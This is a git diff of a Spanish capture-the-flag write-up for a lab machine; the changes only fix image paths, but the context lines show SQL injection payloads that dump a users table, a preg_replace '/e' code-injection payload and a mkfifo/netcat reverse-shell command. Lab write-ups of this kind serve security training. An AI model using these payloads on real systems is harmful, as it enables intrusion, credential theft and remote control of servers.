@@ -21,7 +21,7 @@ PORT     STATE SERVICE
 
 Si miramos la página web podemos ver una página por defecto y también la `flag`
 
-![image](../../../../Imágenes/20250521115625.png)
+![image](../../../Imágenes/20250521115625.png)
 
 Podemos verla desde la consola con una petición `curl` grepeando por la string `JET`
 
@@ -96,7 +96,7 @@ Para que sepa a donde resolver cada que apuntamos al `dominio`, agregamos al arc
 
 Al visitar la web esta vez desde el `dominio` en la parte de abajo podemos otra `flag`
 
-![image](../../../../Imágenes/20250521115740.png)
+![image](../../../Imágenes/20250521115740.png)
   
 
 ### Going Deeper
@@ -105,11 +105,11 @@ Al visitar la web esta vez desde el `dominio` en la parte de abajo podemos otra 
 
 En el `codigo` fuente de la página podemos ver que carga 2 archivos con extensión `js`, uno es el del template y el otro tiene un nombre bastante interesante: `secure.js`
 
-![image](../../../../Imágenes/20250521115848.png)
+![image](../../../Imágenes/20250521115848.png)
 
 Lo abrimos y nos encotramos con que no esta en texto claro si no en decimal
 
-![image](../../../../Imágenes/20250521120051.png)
+![image](../../../Imágenes/20250521120051.png)
 
 Podemos verlo mas comodamente desde una petición `curl`, el script convierte los decimales a texto con `fromCharCode` de la clase String y lo ejecuta con `eval`
 
@@ -151,15 +151,15 @@ setInterval(function(){ getStats(); }, 10000);
 
 Al apuntar al directorio y el archivo `stats.php` podemos ver que nos devuelve solo un `numero` que realmente no esta del todo claro cual es su proposito
 
-![image](../../../../Imágenes/20250521120123.png)
+![image](../../../Imágenes/20250521120123.png)
 
 Si quitamos el `stats.php` y nos quedamos en `/admin` nos redirige a `login.php`
 
-![image](../../../../Imágenes/20250521120205.png)
+![image](../../../Imágenes/20250521120205.png)
 
 En el `codigo` fuente del `login.php` nos encontramos con la `flag` en un comentario
 
-![image](../../../../Imágenes/20250521120233.png)
+![image](../../../Imágenes/20250521120233.png)
 
   
 ### Bypassing Authentication
@@ -168,15 +168,15 @@ En el `codigo` fuente del `login.php` nos encontramos con la `flag` en un coment
 
 Tenemos un `login`, credenciales por defecto como `admin:admin` no nos funcionaran
 
-![image](../../../../Imágenes/20250521120318.png)
+![image](../../../Imágenes/20250521120318.png)
 
 Sin embargo al pasarle como nombre `admin' and sleep(5)-- -` la web tarda `5` segundos darnos una respuesta, significa que es vulnerable a una `inyeccion sql`
 
-![image](../../../../Imágenes/20250521120439.png)
+![image](../../../Imágenes/20250521120439.png)
 
 Interceptando la petición con `burpsuite` podemos ver como se tramita la data
 
-![image](../../../../Imágenes/20250521120419.png)
+![image](../../../Imágenes/20250521120419.png)
 
 Vamos con la forma fácil, iniciamos guardando la petición en un archivo `request`
 
@@ -300,7 +300,7 @@ Table: users
 
 Vimos que se puede enumerar con una `sql injection` time based, sin embargo al enviar solo una `'` como campo username devuelve un 302 pero antes un `error`
 
-![image](../../../../Imágenes/20250521120532.png)
+![image](../../../Imágenes/20250521120532.png)
 
 Basándonos en un [articulo](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/) podemos crear una `query` para una sqli `error based` `doble query` para enumerar la base de datos en uso con `database()`
 
@@ -312,7 +312,7 @@ Basándonos en un [articulo](https://securiumsolutions.com/blog/sql-injection-by
 
 Hay que tener en cuenta que para enviarlo necesitamos `urlcondearlo` podemos hacerlo desde burpsuite con `Ctrl U`, enviamos y vemos en la respuesta `jetadmin`
 
-![image](../../../../Imágenes/20250521120610.png)
+![image](../../../Imágenes/20250521120610.png)
 
 Seguimos la misma logica para leer las bases de datos, como devuelve varios resultados nos limitaremos a uno con `limit 0,1`, vemos `information_schema`
 
@@ -321,7 +321,7 @@ Seguimos la misma logica para leer las bases de datos, como devuelve varios resu
 ```
 
   
-![image](../../../../Imágenes/20250521120639.png)
+![image](../../../Imágenes/20250521120639.png)
 
 Podemos concatenar varias `querys` asi que agregamos un `0x20` para un espacio y copiamos la `query` esta vez cambiando `0,1` por `1,1` para ver ambos resultados
 
@@ -330,7 +330,7 @@ Podemos concatenar varias `querys` asi que agregamos un `0x20` para un espacio y
 ```
 
   
-![image](../../../../Imágenes/20250521120703.png)
+![image](../../../Imágenes/20250521120703.png)
 
 Solo existe la base de datos `jetadmin` asi que pasaremos a enumerar sus `tablas`
 
@@ -338,7 +338,7 @@ Solo existe la base de datos `jetadmin` asi que pasaremos a enumerar sus `tablas
 ' or (select 1 from(select count(*),concat((select mid((ifnull(cast(table_name as nchar),0x20)),1,54) from information_schema.tables where table_schema='jetadmin' limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
 ```
 
-![image](../../../../Imágenes/20250521120729.png)
+![image](../../../Imágenes/20250521120729.png)
 
 En la base de datos `jetadmin` solo existe la tabla `users`, asi que podemos enumerar sus `columnas`, en este caso solo encontramos 3 `id`, `username` y `password`
 
@@ -347,7 +347,7 @@ En la base de datos `jetadmin` solo existe la tabla `users`, asi que podemos enu
 ```
 
   
-![image](../../../../Imágenes/20250521120749.png)
+![image](../../../Imágenes/20250521120749.png)
 
 Finalmente dumpeamos las columnas `username` y `password` separandolos por `:`
 
@@ -355,7 +355,7 @@ Finalmente dumpeamos las columnas `username` y `password` separandolos por `:`
 ' or (select 1 from(select count(*),concat((select mid((ifnull(cast(username as nchar),0x20)),1,54) from users limit 0,1),0x3a,(select mid((ifnull(cast(password as nchar),0x20)),1,54) from users limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
 ```
 
-![image](../../../../Imágenes/20250521120814.png)
+![image](../../../Imágenes/20250521120814.png)
 
 Tenemos el `hash` de admin, se lo pasamos a `john` y obtenemos su contraseña
 
@@ -374,11 +374,11 @@ Session completed.
 
 Podemos iniciar sesión en el `admin` con las credenciales de `admin` que conseguimos
 
-![image](../../../../Imágenes/20250521120839.png)
+![image](../../../Imágenes/20250521120839.png)
 
 Ahora podemos ver un dashboard y en uno de los mensajes encontramos la `flag`
 
-![image](../../../../Imágenes/20250521121216.png)  
+![image](../../../Imágenes/20250521121216.png)  
 
 ### Command
 
@@ -386,15 +386,15 @@ Ahora podemos ver un dashboard y en uno de los mensajes encontramos la `flag`
 
 En el dashboard entre otras cosas vemos un campo donde podemos enviar `correos`
 
-![image](../../../../Imágenes/20250521121251.png)
+![image](../../../Imágenes/20250521121251.png)
 
 Así que enviamos un correo simplemente rellenando todos los campos con `test`, al enviarlo nos habla de que modifiquemos el mensaje para pasar el filtro de profanidad
 
-![image](../../../../Imágenes/20250521121311.png)
+![image](../../../Imágenes/20250521121311.png)
 
 Interceptando la petición además de nuestros campos ingresados podemos ver varios con `swearwords` como prefix, y las cambia por otras palabras, tambien vemos usa `/i`
 
-![image](../../../../Imágenes/20250521121335.png)
+![image](../../../Imágenes/20250521121335.png)
 
 Leyendo un [articulo](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) sobre la función `preg_replace()` podemos ver que `/i` se usa para que sea case insentitive pero podemos usar `/e` como interprete de php, asi que podemos cambiarlo e inyectar codigo `php` para que nos ejecute el comando `id`
 
@@ -407,7 +407,7 @@ swearwords[/fuck/e]=system('id')
 
 Podemos eliminar los campos innecesarios, al cambiar nuestra data para que nos ejecute el comando `id` podemos ver reflejado el output del usuario `www-data`
 
-![image](../../../../Imágenes/20250521121620.png)
+![image](../../../Imágenes/20250521121620.png)
 
 Cambiamos nuestro `id` por un payload con `mkfifo` y `nc` para enviar una revshell y nuestra data es la siguiente, hay caracteres especiales asi que lo urlencodeamos
 
@@ -419,7 +419,7 @@ swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%2
 
 Enviamos la data y recibimos una shell como `www-data` en la máquina victima
 
-![image](../../../../Imágenes/20250521122532.png)
+![image](../../../Imágenes/20250521122532.png)
 
 ```
 ❯ sudo netcat -lvnp 443
@@ -574,7 +574,7 @@ Connection received on 10.13.37.10
 
 Podemos iniciar analizando el binario con `ida`, podemos ver la función `main`
 
-![image](../../../../Imágenes/20250521122631.png)
+![image](../../../Imágenes/20250521122631.png)
 
 Inicia definiendo una variable `string` con un buffer de `64` bytes, después printea un mensaje y la `dirección` donde inicia `string`, y recibe el input con `fgets`
 
@@ -1510,7 +1510,7 @@ n: 27938503178839361085851871745305641244414549576641087568698023555774229919928
 
 En este caso la clave es bastante `pequeña`, hay que tener en cuenta que el valor de `n` es el resultado de la multiplicacion de 2 numeros primos, si usamos [factordb.com](http://factordb.com/) logramos factorizar `n`, los 2 numeros que nos devuelve son definidos como `p` y `q`
 
-![image](../../../../Imágenes/20250521122743.png)
+![image](../../../Imágenes/20250521122743.png)
 
 ```
 p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  
